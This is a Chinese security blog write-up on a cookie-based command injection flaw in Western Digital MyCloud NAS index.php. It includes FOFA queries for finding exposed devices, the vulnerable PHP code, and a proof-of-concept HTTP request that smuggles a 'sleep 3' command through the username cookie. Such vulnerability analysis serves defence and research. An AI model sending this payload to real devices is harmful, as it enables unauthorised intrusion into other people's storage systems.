---
title: "西部数码 NAS index.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-index-rce.html
asset_dir: assets/西部数码-nas-index.php-命令执行漏洞
---

# 西部数码 NAS index.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/7 12:05
* 781浏览
* [0评论](#comment)
* 13分钟阅读

深入探索

软件

Western Digital

滙豐卡$2000減$150 WD 3.5吋 4TB My Cloud Home 網絡儲存裝置 wdbvxc0040hwt 香港行貨


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS index.php中Cookie存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞预警服务

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

深入探索

web服务器

备份

云安全解决方案

直接看 `index.php` 其业务实现逻辑如下

```
function do_login($username)
{
        $ret = 0; //no login;

        if ($username != "")
        {
                /* [+] Get Web Timeout setting */
                $res = array();
                exec("xmldbc -g /system_mgr/idle/time", $res);
                $web_timeout = $res[0]*60;
                /* [-] Get Web Timeout setting */

                exec("wto -n \"$username\" -g", $ret);
```

在看下`$username`来自那里

硬盘驱动器

```
if (isset($_SESSION['username']))
{
    $username = $_SESSION['username'];
}
else if (isset($_COOKIE['username']))
{
    $username = $_COOKIE['username'];
}
```

通过`session`或者`cookie`里的`username`获取，用户可控的部分为`cookie`,且不需要登录，前台权限即可。

深入探索

服务器

网页服务器

MyCloud NAS

再看下那里调用了`do_login`方法

[![西部数码 NAS index.php 命令执行漏洞](images/img-001-c9809c351d70.webp)](https://image.mrxn.net/fbb3399b3ddc41558a90f88006b19827.webp)

自此，整个流程就通了，代码中通过`cookie`里的`username`直接获取用户输入参数，未经过任何过滤或转义便拼接至系统命令 `exec("wto -n \"$username\" -g", $ret);` 中，攻击者可通过构造恶意参数[注入任意系统命令](https://mrxn.net/tag/rce)。

# 漏洞复现

```
GET /web/index.php HTTP/1.1
Host: west.nas.mrxn.net
Cookie: username=a" || sleep 3 || "
```

[![西部数码 NAS index.php 命令执行漏洞](images/img-002-0e72177b91cc.webp)](https://image.mrxn.net/555d5c70d32343d18b8fb5cdd70f3298.webp)

成功延时 3 秒

数据备份与恢复

* 标签：
* [#代码](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81)
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#php](https://mrxn.net/tag/php)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[西部数码 NAS index.php 命令执行漏洞](https://mrxn.net/jswz/west-nas-index-rce.html)  
文章链接：<https://mrxn.net/jswz/west-nas-index-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKiklEQVR4Aeybi3bjNgxEfff//7n1CBkSEmFazktulznBDjgYgDQh2Jt0++d2u/3zVfvn8JXrOVRxjglz/Ku+6p0x71NpHctY6cxl3Vd8NeSev77f5QZaQ+6dvr1isxeQ6wA3YFcbgoOOrpdz7VexijvqpYG+ByCqWaV30DGhOWB7LdDRsYzKecVybmtIJpd/3Q0MDYHefRj92VEh9FnjJwUiBrSwY0KTQHsKzRnhcUwaiLh8m2rLvK4QIg+owrvpVq1sZcIHCbTXAqP/IdvB0JBddC1+/QZWQ379yucb/nhDIEY1j7n9fDRzGeFxrnUQGuh/cch1IeKZO/quJYRRD+e4Y93PrH+8IZ851N+c860N0RMmyxeqtQziKQNaGGgfeo2cOND1EL5q2yC4XMIxY47BqM9x+86F0EM9jdZ/Bb+1Ie0gy/n0DayGfPrqfiZxaIjH8xG+egyIMa/y8h6OQ+gBU6fR9XICsL0tmoNYA6ZKBLY8oMVdXwhs8RYsHOlmVqTchoZUosX93g20hkB0HM5hdUSI3CqWnxQYdRBc1lV1zFkHkQc4tD25wIZHndfCllA4itsgahWykoLQwznMRVpDMrn8625gNeS6uy93/uOx/Aq6smtAH1XHMlqXOfvQc62D4KzJaI3QvHzbkfNaaA1EfUD0YNblwJHz+qu4JiTf8hv404YA2wcjdPSZoXMQvmPVUwKhASwrMedakDn7jgEPzygNjHEITnGZawq1lkFoAC03A9peG/HCH9BzIfwqfdqQKuFC7q/Y+g/suwWxhv77Gj05Noi418IzNyWdzXqIWtD3gs5ZVyGEropVnPfOaB1ELejnqHTWP0Po9SD8XM++60BogPWD4e3NvtZb1rs3xOMkhBilfGbxMogY9DHPOvvQdbD3rcmo2jZ4rLcm59qHnmcdBGeNEEZOvAwiBmi5mWsJN+L+B7B90N/dU98QeuioerY1Iaeu8fdErSEQHctbu2uZg9A5JoTgrINYQ58e6WzWVQhjbqUz55oZHasQXqufa0DPhfAdh1hDf82OCSHi+Zz2IWLA+lC/vdlXm5A3O9dfe5xpQ6CPEoTvm4JYA6YaehSFwPChJ17WEpIj3gaR63WSbTUh4rDHrLNf1TjGpHmVs75C1TvaM920IVXy/457sxc0/LYX+tPm7lZndizjTDeLqUYVP3IwP5vqyHIeRI45xW3mziJELRg/uF1TCF0H4XsPiDVgajfta0LatbyHsxryHn1op2i/XAS20WmRJw6EHjo6BToH4TuWESIGNBrYzgH9bQGC09uBDYJriXcHRu5O774hNEDjgbanSegchO+9hdYZITSAqd2/mge2PZRrg+Bawt1ZE3K/hHf6Hj7U3T0hRAflz8wvCB7rIWLQ0XlCCD7vI15mTr6t4hzLeNR5LYRxTxg5aWUQMSBvsfmKHw3YpgLGaQe2PP2R89aE6EbeyFZD3qgZOkprCLCNl8gzBqGHPo7Ogx6D8B0T5hG1L/5oMOZaA49j1lQIkQf93NC5KueznF+b0DXk28xlbA3J5PK/fAOfLtAa4q7B+LTAyFkvhIjLl1WnEW+D0ENH50DnrD8Ts+YRQtR1TSEEl3PEyzIHow5GLufIh9BAjdIcrTXkGFjra26gNQSii3o6ZuZjQuhhfC+u8p2XMesybx/6HoDpp/isrgtY57UQGD5LK505I0QedFQ9m3VeC81Bz2kNkWDZ9TewGnJ9D3YnaA2pxmen/FhAjJf1wo9QAwgN1NiEyVGdo6XwKdf5MO47K+C8jHCuBoQu13edzFU+RK71wtaQKmFxv38D09/2QnQwH0tdlEHEoKN4WaV/xkHUyTr7qinzOqN4m3mvhUfOayGMe0Jwyp0Z7HWqNzMIfda4PkQMWP/q5PZmX+st690a4rGpzmUO+khB+M4TWlchhL6KZU51ZM+4HJcPUR/QcjNg+1kCxp+RYB7TGWRboY8/oOdA+NLIYL9+xH2U2v1Hq4pbE+JbeRNsH+rVedRtWRWDeDKAIawc2xB8QADbU53DMHI5fsaHfQ2fSwj7mOrByImXKcemtey4FlfZWd2akOr2LuRWQy68/Grr9t/Uq6A5j9sjtK7CKgfibQE6WlfVgNBVMecJIXTyHxmEBmjlKi2wvYUCTQc0Dh77rtcS7w481kOPrQm5X9Y7fbcP9VlXqwND76pzIbish5GzPusqf6aDqAsdqxrmIHReC6v6EDrHHqHyZY7Lt0HU8PoROjfjmpBHt3URP3yG5G7NzpR1EE+EOYg1zH8wm9XPMdfN3Hf40M8J4b+6F0RedR6IGPR7eKa7YEKqIy3ON7Aa4pt4E2wf6j4P9DE7y3nMIXKdJ4TgrBGKl8m3aX00iFwIPMaP61mto1brSg+xF8xR+TLXeIYQ9bJO+UdbE3K8kYvXQ0NyByvf580xiO5XMXMZnQuRB7Qw0H74su4sQuS2YncHgnONO9W+IWKNuDvWVXgPt2/HG5EcGOs6DBGDjo4Jh4aIXHbdDayGXHf35c7DzyGlqiChj9xsfIvU8i3JOtcSQuzhGMQaOjqWEXpcdWQQnPyZ5Tqv+BD1Yf4zR7V33mdNSL6NN/DbX3uhdxjCr84HEcudhuAqvXUQGqCSTTlgm6pKBBEDqvCWB3WsTPgggSHXr0X4IZsCjDWgcxC+6tn+NxMyvZn/UHA15M2a9emGQIwbMH1JwDb6HknhLAFCD+OHo3JtruG10FyFisug1690EPFZDGhhYHh9MHLa+5FB6IH1D+Vub/Y1TEjuos8KvYPmKp1j0PXWwZyDiLvGM3Td79BB7A20cq4vbGRygN1kQKxhnOyUtuVA10LXa6+hITl5+b9/A6shv3/n0x2HhsB+nGA/UhorGXSddxB/NAidNc8w51trDqIW4FCJ1gstALa3C3E2GLmjHkIDOLRDYKubSQgORsw6+9B1Q0MsWnjNDbTfZfmpqbA6WqWD6PQzfRV/lYPYCzr6TNA5CL+qX+nNZXTuMy7H5TtPqPUZWxOi23povx+Y/i4L4umCOZ45NvQa1ldPDHQdhD/T5xrWVWhdFas4iL2BFga2zwugcXaAhzFpoMchfPFHWxNyvJGL16shFzfguH1riEf6LB4Lae1c+WcMYnSBqRxobwcQvhMg1tDR58g40zv2CHMd+0eteeExlteK2zJvvzXExMJrb2BoCPQnDUZ/dlwY9bOnYVarirmWEGKvSpc52OuUa7POayHs9dJAcNBRvAw6B3tf8VdtaMirBZb+e29gNeR77/PL1X68IRBjrLcDm0/ttRBC51iFEBqghZVra2RyHAO2vxikUPtflCFi0H9vV+kyZ9/1M1Yxc9D3qrgfb4g3XdhvYOZ9a0P8lMw2VAziKZFvc26F1lQIUQvqp/uYA11/jGkNEc/ngOAUPxo8j0E/27O639qQ42HX+vUbWA15/c5+NGNoSB6pyv+O07guxLgDL5d1jYwuAmwf4ICp9gFe6TNnvyUmx7EKk6ztlTn7QDub6zgmHBoictl1N9AaAr1z8NyfHdmdF57VQexZ6VXnaNZB5EHHrD3qvM4IPTfz9l3PayH0HNj7ih8NQnPktXZ9YWuIAsuuv4HVkOt7sDvBvwAAAP//j/NcsgAAAAZJREFUAwDWu8F3YNaeSgAAAABJRU5ErkJggg==)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-index-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKiklEQVR4Aeybi3bjNgxEfff//7n1CBkSEmFazktulznBDjgYgDQh2Jt0++d2u/3zVfvn8JXrOVRxjglz/Ku+6p0x71NpHctY6cxl3Vd8NeSev77f5QZaQ+6dvr1isxeQ6wA3YFcbgoOOrpdz7VexijvqpYG+ByCqWaV30DGhOWB7LdDRsYzKecVybmtIJpd/3Q0MDYHefRj92VEh9FnjJwUiBrSwY0KTQHsKzRnhcUwaiLh8m2rLvK4QIg+owrvpVq1sZcIHCbTXAqP/IdvB0JBddC1+/QZWQ379yucb/nhDIEY1j7n9fDRzGeFxrnUQGuh/cch1IeKZO/quJYRRD+e4Y93PrH+8IZ851N+c860N0RMmyxeqtQziKQNaGGgfeo2cOND1EL5q2yC4XMIxY47BqM9x+86F0EM9jdZ/Bb+1Ie0gy/n0DayGfPrqfiZxaIjH8xG+egyIMa/y8h6OQ+gBU6fR9XICsL0tmoNYA6ZKBLY8oMVdXwhs8RYsHOlmVqTchoZUosX93g20hkB0HM5hdUSI3CqWnxQYdRBc1lV1zFkHkQc4tD25wIZHndfCllA4itsgahWykoLQwznMRVpDMrn8625gNeS6uy93/uOx/Aq6smtAH1XHMlqXOfvQc62D4KzJaI3QvHzbkfNaaA1EfUD0YNblwJHz+qu4JiTf8hv404YA2wcjdPSZoXMQvmPVUwKhASwrMedakDn7jgEPzygNjHEITnGZawq1lkFoAC03A9peG/HCH9BzIfwqfdqQKuFC7q/Y+g/suwWxhv77Gj05Noi418IzNyWdzXqIWtD3gs5ZVyGEropVnPfOaB1ELejnqHTWP0Po9SD8XM++60BogPWD4e3NvtZb1rs3xOMkhBilfGbxMogY9DHPOvvQdbD3rcmo2jZ4rLcm59qHnmcdBGeNEEZOvAwiBmi5mWsJN+L+B7B90N/dU98QeuioerY1Iaeu8fdErSEQHctbu2uZg9A5JoTgrINYQ58e6WzWVQhjbqUz55oZHasQXqufa0DPhfAdh1hDf82OCSHi+Zz2IWLA+lC/vdlXm5A3O9dfe5xpQ6CPEoTvm4JYA6YaehSFwPChJ17WEpIj3gaR63WSbTUh4rDHrLNf1TjGpHmVs75C1TvaM920IVXy/457sxc0/LYX+tPm7lZndizjTDeLqUYVP3IwP5vqyHIeRI45xW3mziJELRg/uF1TCF0H4XsPiDVgajfta0LatbyHsxryHn1op2i/XAS20WmRJw6EHjo6BToH4TuWESIGNBrYzgH9bQGC09uBDYJriXcHRu5O774hNEDjgbanSegchO+9hdYZITSAqd2/mge2PZRrg+Bawt1ZE3K/hHf6Hj7U3T0hRAflz8wvCB7rIWLQ0XlCCD7vI15mTr6t4hzLeNR5LYRxTxg5aWUQMSBvsfmKHw3YpgLGaQe2PP2R89aE6EbeyFZD3qgZOkprCLCNl8gzBqGHPo7Ogx6D8B0T5hG1L/5oMOZaA49j1lQIkQf93NC5KueznF+b0DXk28xlbA3J5PK/fAOfLtAa4q7B+LTAyFkvhIjLl1WnEW+D0ENH50DnrD8Ts+YRQtR1TSEEl3PEyzIHow5GLufIh9BAjdIcrTXkGFjra26gNQSii3o6ZuZjQuhhfC+u8p2XMesybx/6HoDpp/isrgtY57UQGD5LK505I0QedFQ9m3VeC81Bz2kNkWDZ9TewGnJ9D3YnaA2pxmen/FhAjJf1wo9QAwgN1NiEyVGdo6XwKdf5MO47K+C8jHCuBoQu13edzFU+RK71wtaQKmFxv38D09/2QnQwH0tdlEHEoKN4WaV/xkHUyTr7qinzOqN4m3mvhUfOayGMe0Jwyp0Z7HWqNzMIfda4PkQMWP/q5PZmX+st690a4rGpzmUO+khB+M4TWlchhL6KZU51ZM+4HJcPUR/QcjNg+1kCxp+RYB7TGWRboY8/oOdA+NLIYL9+xH2U2v1Hq4pbE+JbeRNsH+rVedRtWRWDeDKAIawc2xB8QADbU53DMHI5fsaHfQ2fSwj7mOrByImXKcemtey4FlfZWd2akOr2LuRWQy68/Grr9t/Uq6A5j9sjtK7CKgfibQE6WlfVgNBVMecJIXTyHxmEBmjlKi2wvYUCTQc0Dh77rtcS7w481kOPrQm5X9Y7fbcP9VlXqwND76pzIbish5GzPusqf6aDqAsdqxrmIHReC6v6EDrHHqHyZY7Lt0HU8PoROjfjmpBHt3URP3yG5G7NzpR1EE+EOYg1zH8wm9XPMdfN3Hf40M8J4b+6F0RedR6IGPR7eKa7YEKqIy3ON7Aa4pt4E2wf6j4P9DE7y3nMIXKdJ4TgrBGKl8m3aX00iFwIPMaP61mto1brSg+xF8xR+TLXeIYQ9bJO+UdbE3K8kYvXQ0NyByvf580xiO5XMXMZnQuRB7Qw0H74su4sQuS2YncHgnONO9W+IWKNuDvWVXgPt2/HG5EcGOs6DBGDjo4Jh4aIXHbdDayGXHf35c7DzyGlqiChj9xsfIvU8i3JOtcSQuzhGMQaOjqWEXpcdWQQnPyZ5Tqv+BD1Yf4zR7V33mdNSL6NN/DbX3uhdxjCr84HEcudhuAqvXUQGqCSTTlgm6pKBBEDqvCWB3WsTPgggSHXr0X4IZsCjDWgcxC+6tn+NxMyvZn/UHA15M2a9emGQIwbMH1JwDb6HknhLAFCD+OHo3JtruG10FyFisug1690EPFZDGhhYHh9MHLa+5FB6IH1D+Vub/Y1TEjuos8KvYPmKp1j0PXWwZyDiLvGM3Td79BB7A20cq4vbGRygN1kQKxhnOyUtuVA10LXa6+hITl5+b9/A6shv3/n0x2HhsB+nGA/UhorGXSddxB/NAidNc8w51trDqIW4FCJ1gstALa3C3E2GLmjHkIDOLRDYKubSQgORsw6+9B1Q0MsWnjNDbTfZfmpqbA6WqWD6PQzfRV/lYPYCzr6TNA5CL+qX+nNZXTuMy7H5TtPqPUZWxOi23povx+Y/i4L4umCOZ45NvQa1ldPDHQdhD/T5xrWVWhdFas4iL2BFga2zwugcXaAhzFpoMchfPFHWxNyvJGL16shFzfguH1riEf6LB4Lae1c+WcMYnSBqRxobwcQvhMg1tDR58g40zv2CHMd+0eteeExlteK2zJvvzXExMJrb2BoCPQnDUZ/dlwY9bOnYVarirmWEGKvSpc52OuUa7POayHs9dJAcNBRvAw6B3tf8VdtaMirBZb+e29gNeR77/PL1X68IRBjrLcDm0/ttRBC51iFEBqghZVra2RyHAO2vxikUPtflCFi0H9vV+kyZ9/1M1Yxc9D3qrgfb4g3XdhvYOZ9a0P8lMw2VAziKZFvc26F1lQIUQvqp/uYA11/jGkNEc/ngOAUPxo8j0E/27O639qQ42HX+vUbWA15/c5+NGNoSB6pyv+O07guxLgDL5d1jYwuAmwf4ICp9gFe6TNnvyUmx7EKk6ztlTn7QDub6zgmHBoictl1N9AaAr1z8NyfHdmdF57VQexZ6VXnaNZB5EHHrD3qvM4IPTfz9l3PayH0HNj7ih8NQnPktXZ9YWuIAsuuv4HVkOt7sDvBvwAAAP//j/NcsgAAAAZJREFUAwDWu8F3YNaeSgAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-index-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 